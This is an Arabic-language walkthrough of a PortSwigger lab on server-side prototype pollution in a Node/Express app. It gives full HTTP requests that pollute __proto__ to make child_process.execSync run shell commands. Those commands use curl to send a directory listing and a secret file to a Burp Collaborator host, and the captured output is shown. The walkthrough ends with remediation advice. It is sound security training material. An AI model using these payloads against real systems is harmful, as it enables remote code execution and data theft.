# [Exfiltrating sensitive data via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution)

## **`الهدف`**
قم بالعثور على مصدر يمكنك استخدامه لإضافة خصائص عشوائية إلى `Object.prototype`، ثم قم بتحديد أداة تسمح لك بحقن أوامر النظام، ثم قم بتنفيذ أمر عن بُعد يُسرب محتويات `/home/carlos` إلى سيرفر `Burp Collaborator` العام، ثم قم باستخراج محتويات ملف `secret` إلى سيرفر `Burp Collaborator` العام، ثم قم بتقديمه كـ `Solution`.
## **`خطوات الحل`**
==**`ملاحظات هامة:`**== 
1. لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.
2. يمكن حل هذا اللاب عن طريق`Status code override` أو `JSON spaces override` أو `Charset override` ولكني سأستعمل الطريقة الثانية هنا.

سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنقوم بتغيير أى جزء من الـ `Billing and Delivery Address` ونضغط `Submit` وبعد ذلك سنقوم بالعثور على الطلب الخاص بهذا الجزء في `HTTP history` ونقوم بتحويله إلى `Repeater`
```http
POST /my-account/change-address HTTP/2
Host: 0a3b00f704fa9a68827056c400cb007c.web-security-academy.net
Cookie: session=hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke
Content-Length: 163

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke"}
```

وعند فحص الاستجابة سنجد أن السيرفر يرد بـ `JSON` يمثل المستخدم الخاص بنا.
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"bf-hUt5RNzXcUPY/p47gJQ+q/fN5zc"
Date: Thu, 12 Nov 2026 18:14:27 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 191

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__`
```http
POST /my-account/change-address HTTP/2
Host: 0a3b00f704fa9a68827056c400cb007c.web-security-academy.net
Cookie: session=hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke","__proto__": {
    "json spaces":10
}}
```
وعند فحص الاستجابة من داخل تاب `Raw` سنلاحظ وجود تأثير على الـ `JSON indentation`
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"149-ZVBU6GrZ8fT0+Y7Y+0TIzGg8vzQ"
Date: Thu, 12 Nov 2026 18:14:51 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 329

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "TEST",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنلاحظ في الـ `HTTP history` أنه يحدث طلب يوضح أن هذا الزر يُشغل مهامًا تعمل فى الخلفية لتنظيم قاعدة البيانات ونظام الملفات، وهذا مثال نموذجي على نوع الوظائف التي قد تُنشئ عمليات فرعية في `Node`
```http
POST /admin/jobs HTTP/2
Host: 0a59001c03c6784b823b423800f9005a.web-security-academy.net
Cookie: session=1ODm0ruIzk85d3wwogIFXaC7lhbYqGEq

{"csrf":"c90lAvWWkADWoTLob2hnft4hHZwcFyj1","sessionId":"1ODm0ruIzk85d3wwogIFXaC7lhbYqGEq","tasks":["db-cleanup","fs-cleanup"]}
```

والاستجابة تكون
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"9b-+KjpDl/a+GHhg3BKsoq8hLbGyO8"
Date: Thu, 12 Nov 2026 18:27:45 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 155

{"results":[{"description":"Database cleanup","name":"db-cleanup","success":true},{"description":"Filesystem cleanup","name":"fs-cleanup","success":true}]}
```

بعد ذلك سنقوم بتعديل الطلب لمحاولة تلويث النموذج الأولي بمجموعة من الخصائص الخبيثة التي تتحكم في الخيارات المرسلة إلى دالة `child_process.execSync()` بحيث يؤدي الأمر المحقون إلى تفاعل مع سيرفر `Burp Collaborator` العام:

```http
POST /my-account/change-address HTTP/2
Host: 0a3b00f704fa9a68827056c400cb007c.web-security-academy.net
Cookie: session=hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke","__proto__": {
    "shell":"vim",
    "input":":! curl https://stp4il5or9jg5b62mh07m0xyyp4nsdg2.oastify.com\n"
}}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنجد أنه قد حدث تفاعل مع `Burp Collaborator` وهذا يؤكد وجود ثغرة `RCE`

لذلك سنعود ونقوم بتعديل الـ `Payload` ليقوم بتسريب محتويات `Carlos's home directory`  إلى سيرفر `Burp Collaborator` العام ليصبح كالتالي:
```http
POST /my-account/change-address HTTP/2
Host: 0a3b00f704fa9a68827056c400cb007c.web-security-academy.net
Cookie: session=hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke","__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @- https://2ruegv3ypjhq3l4ckryhkav8wz2yqoed.oastify.com\n"
}}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنجد أنه قد حدث تفاعل مع `Burp Collaborator` وعند فحص تفاعل الـ `HTTP`
```http
POST / HTTP/1.1
Host: 2ruegv3ypjhq3l4ckryhkav8wz2yqoed.oastify.com
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 24
Content-Type: application/x-www-form-urlencoded

bm9kZV9hcHBzCnNlY3JldAo=
```

وسنقوم بنسخ محتويات جسم الطلب وسنقوم بعمل `Base64 Decoding` له من داخل `Burp Decoder` لنجده كالتالي:
```http
node_apps
secret
```

لذلك سنعود ونقوم بتعديل الـ `Payload` ليقوم باستخراج محتويات ملف `/home/carlos/secret`  إلى سيرفر `Burp Collaborator` العام ليصبح كالتالي:
```http
POST /my-account/change-address HTTP/2
Host: 0a3b00f704fa9a68827056c400cb007c.web-security-academy.net
Cookie: session=hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hXKxdNdGlyA44ST0CyAp0ROWSG7BCzke","__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://tjg58mvpha9hvcw3ciq8c1nzoquqig65.oastify.com\n"
}}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنجد أنه قد حدث تفاعل مع `Burp Collaborator` وعند فحص تفاعل الـ `HTTP`
```http
POST / HTTP/1.1
Host: tjg58mvpha9hvcw3ciq8c1nzoquqig65.oastify.com
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 44
Content-Type: application/x-www-form-urlencoded

dWVTYWpvQm1SZnh1NVBTNXkzbEppVTZKZXEzQm01Mk8=
```

وسنقوم بنسخ محتويات جسم الطلب وسنقوم بعمل `Base64 Decoding` له من داخل `Burp Decoder` لنجده كالتالي:
```http
ueSajoBmRfxu5PS5y3lJiU6Jeq3Bm52O
```

لذلك سنقوم بنسخ هذه القيمة `ueSajoBmRfxu5PS5y3lJiU6Jeq3Bm52O` ونعود إلى المتصفح ثم نضغط على `Submit solution` ونضعها في الحقل المناسب ونضغط على `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Privilege escalation via server-side prototype pollution](./Privilege-escalation-via-server-side-prototype-pollution.md)

ويجب على المطورين تمرير كائن خيارات `Options Object` فارغ أو محدد مسبقاً بصرامة عند استدعاء دوال حساسة مثل `child_process.execSync()` لضمان عدم وراثتها لأي خصائص ملوثة من الـ `Prototype`.

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind OS` أو تسريب البيانات `Out-of-band Data Exfiltration`.
